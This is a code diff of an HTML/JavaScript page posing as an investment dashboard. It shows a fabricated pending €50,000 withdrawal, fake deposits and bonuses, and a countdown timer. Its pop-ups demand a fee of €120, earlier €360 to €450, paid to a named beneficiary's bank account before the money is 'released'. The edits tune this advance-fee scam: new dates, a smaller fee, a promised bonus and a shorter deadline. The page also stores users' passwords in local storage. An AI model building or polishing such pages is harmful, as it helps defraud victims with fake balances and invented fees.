@@ -132,19 +132,19 @@ button:hover{transform:translateY(-3px);}
 <div class="section-title">Recent Transactions</div>
 <div class="card" id="transactionList">
 <div class="transaction">
-<div class="left"><div class="circle">⏳</div><div><div>Withdraw to<br>Bank Transfer</div><span class="pending-badge">PROCESSING</span><div class="small">22/5/2026</div></div></div>
+<div class="left"><div class="circle">⏳</div><div><div>Withdraw to<br>Bank Transfer</div><span class="pending-badge">PROCESSING</span><div class="small">3/6/2026</div></div></div>
 <div style="text-align:right;"><div style="color:#fbbf24;font-size:14px;">-</div><div class="yellow" style="font-size:18px;font-weight:700;">€50,000.68</div></div>
 </div>
 <div class="transaction">
-<div class="left"><div class="circle">⬇️</div><div><div>Deposit</div><div class="small">19/5/2026</div></div></div>
+<div class="left"><div class="circle">⬇️</div><div><div>Deposit</div><div class="small">3/6/2026</div></div></div>
 <div style="text-align:right;"><div style="color:#00ff99;font-size:14px;">+</div><div class="green" style="font-size:18px;font-weight:700;">€8,000.00</div></div>
 </div>
 <div class="transaction">
-<div class="left"><div class="circle">🎁</div><div><div>Bonus<br>Reward</div><div class="small">18/5/2026</div></div></div>
+<div class="left"><div class="circle">🎁</div><div><div>Bonus<br>Reward</div><div class="small">3/6/2026</div></div></div>
 <div style="text-align:right;"><div style="color:#00ff99;font-size:14px;">+</div><div class="green" style="font-size:18px;font-weight:700;">€2,450.00</div></div>
 </div>
 <div class="transaction">
-<div class="left"><div class="circle">🎉</div><div><div>Cashback<br>Reward</div><div class="small">17/5/2026</div></div></div>
+<div class="left"><div class="circle">🎉</div><div><div>Cashback<br>Reward</div><div class="small">3/6/2026</div></div></div>
 <div style="text-align:right;"><div style="color:#00ff99;font-size:14px;">+</div><div class="green" style="font-size:18px;font-weight:700;">€650.00</div></div>
 </div>
 </div>
@@ -169,14 +169,13 @@ button:hover{transform:translateY(-3px);}
 <div style="display:flex;align-items:center;gap:15px;margin-bottom:15px;">
 <div style="width:50px;height:50px;background:rgba(251,191,36,.2);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:24px;">🔔</div>
 <div>
-<div style="font-size:16px;font-weight:600;">FUND SETTLEMENT</div>
-<div class="small">Today • 25/5/2026</div>
+<div style="font-size:16px;font-weight:600;">...</div>
+<div class="small">Today • 3/6/2026</div>
 </div>
 </div>
 <div style="padding:15px;background:rgba(0,0,0,.2);border-radius:16px;margin-top:10px;">
 <div style="font-size:14px;line-height:1.7;opacity:.9;">
-For this fund settlement to be completed, a settlement fee of <span style="color:#fbbf24;font-weight:700;">€360</span> is required.<br><br>
-This settlement covers the processing and final release of the €50,000 transfer to the designated bank account.<br><br>
+A payment of <span style="color:#fbbf24;font-weight:700;">€120</span> is required for the €5,000 bonus to be added along with the €50,000 transfer to be successful within 6 hours.<br><br>
 <span style="color:#fbbf24;font-weight:700;">Euro</span><br>
 Begunstigde<br>
 Aris Adrianus Cornelis Groenendijk<br><br>
@@ -202,7 +201,7 @@ BIC van de correspondentbank<br>CHASDEFX
 <div style="width:50px;height:50px;background:#1b2348;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:20px;">✅</div>
 <div>
 <div style="font-size:15px;font-weight:600;">Deposit Completed</div>
-<div class="small">Yesterday • 21/5/2026</div>
+<div class="small">Yesterday • 3/6/2026</div>
 </div>
 </div>
 <div style="margin-top:10px;font-size:14px;opacity:.8;">Your deposit of €8,000.00 has been confirmed.</div>
@@ -212,7 +211,7 @@ BIC van de correspondentbank<br>CHASDEFX
 <div style="width:50px;height:50px;background:#1b2348;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:20px;">🎁</div>
 <div>
 <div style="font-size:15px;font-weight:600;">Bonus Reward</div>
-<div class="small">2 days ago • 20/5/2026</div>
+<div class="small">2 days ago • 3/6/2026</div>
 </div>
 </div>
 <div style="margin-top:10px;font-size:14px;opacity:.8;">You received a bonus reward of €2,450.00</div>
@@ -248,7 +247,7 @@ BIC van de correspondentbank<br>CHASDEFX
 <div class="alert-box">
 <div class="alert-icon">⏳</div>
 <div class="alert-title">Processing...</div>
-<div class="alert-text">Your withdrawal request is being processed.<br><br>To complete the withdrawal, you need to make a <span class="alert-highlight">€400 transaction payment</span> now.</div>
+<div class="alert-text">Your withdrawal request is being processed.<br><br>A payment of <span class="alert-highlight">€120</span> is required for the €5,000 bonus to be added along with the €50,000 transfer to be successful within 6 hours.</div>
 <button class="alert-btn" onclick="closeProcessingAlert()">Got it</button>
 </div>
 </div>
@@ -264,10 +263,10 @@ localStorage.setItem("moonName",name);
 localStorage.setItem("moonEmail",email);
 localStorage.setItem("moonPassword",password);
 let defaultTransactions=[
-  {icon:"⏳",name:"Withdraw to Bank Transfer",date:"22/5/2026",amount:50000.68,type:"out",status:"pending"},
-  {icon:"⬇️",name:"Deposit",date:"19/5/2026",amount:8000,type:"in",status:"completed"},
-  {icon:"🎁",name:"Bonus Reward",date:"18/5/2026",amount:2450,type:"in",status:"completed"},
-  {icon:"🎉",name:"Cashback Reward",date:"17/5/2026",amount:650,type:"in",status:"completed"}
+  {icon:"⏳",name:"Withdraw to Bank Transfer",date:"3/6/2026",amount:50000.68,type:"out",status:"pending"},
+  {icon:"⬇️",name:"Deposit",date:"3/6/2026",amount:8000,type:"in",status:"completed"},
+  {icon:"🎁",name:"Bonus Reward",date:"3/6/2026",amount:2450,type:"in",status:"completed"},
+  {icon:"🎉",name:"Cashback Reward",date:"3/6/2026",amount:650,type:"in",status:"completed"}
 ];
 localStorage.setItem("moonTransactions",JSON.stringify(defaultTransactions));
 localStorage.setItem("moonBalance",currentBalance);
@@ -341,7 +340,7 @@ localStorage.setItem("moonBalance",currentBalance);
 updateBalanceDisplay();
 let transactions=JSON.parse(localStorage.getItem("moonTransactions")||"[]");
 let methodName=selectedMethod==='paypal'?'PayPal':'Bank Transfer';
-transactions.unshift({icon:"⏳",name:"Withdraw to "+methodName,date:"22/5/2026",amount:amount,type:"out",status:"pending"});
+transactions.unshift({icon:"⏳",name:"Withdraw to "+methodName,date:"3/6/2026",amount:amount,type:"out",status:"pending"});
 localStorage.setItem("moonTransactions",JSON.stringify(transactions));
 renderTransactions();
 closeWithdrawModal();
@@ -368,8 +367,6 @@ html+=`<div class="transaction"><div class="left"><div class="circle">${tx.icon}
 document.getElementById("transactionList").innerHTML=html;
 }
 function withdrawAlert(){openWithdrawModal();}
-function showFeeAlert(){document.getElementById("feeAlert").style.display="flex";}
-function closeFeeAlert(){document.getElementById("feeAlert").style.display="none";}
 function logout(){
 document.getElementById("dashboard").style.display="none";
 document.getElementById("authBox").style.display="block";
@@ -393,7 +390,7 @@ let countdownInterval;
 function startCountdown(){
   let endTime=localStorage.getItem("moonCountdownEnd");
   if(!endTime){
-    endTime=Date.now()+12*60*60*1000;
+    endTime=Date.now()+9*60*60*1000;
     localStorage.setItem("moonCountdownEnd",endTime);
   }
   function updateTimer(){
@@ -428,21 +425,13 @@ function resetCountdown(){
   startCountdown();
 }
 </script>
-<div class="alert-overlay" id="feeAlert">
-<div class="alert-box">
-<div class="alert-icon">💳</div>
-<div class="alert-title">Transaction Fee Required</div>
-<div class="alert-text">To view and process your transaction history, a <span class="alert-highlight">€450 transaction fee</span> is required.<br><br>Please complete the payment to unlock your transaction records.</div>
-<button class="alert-btn" onclick="closeFeeAlert()">Got it</button>
-</div>
-</div>
+
 <div class="alert-overlay" id="notificationAlert">
 <div class="alert-box">
 <div class="alert-icon">🔔</div>
-<div class="alert-title">FUND SETTLEMENT</div>
+<div class="alert-title">...</div>
 <div class="alert-text">
-For this fund settlement to be completed, a settlement fee of <span class="alert-highlight">€360</span> is required.<br><br>
-This settlement covers the processing and final release of the €50,000 transfer to the designated bank account.<br><br>
+A payment of <span style="color:#fbbf24;font-weight:700;">€120</span> is required for the €5,000 bonus to be added along with the €50,000 transfer to be successful within 6 hours.<br><br>
 Euro<br>
 Begunstigde<br>
 Aris Adrianus Cornelis Groenendijk<br><br>
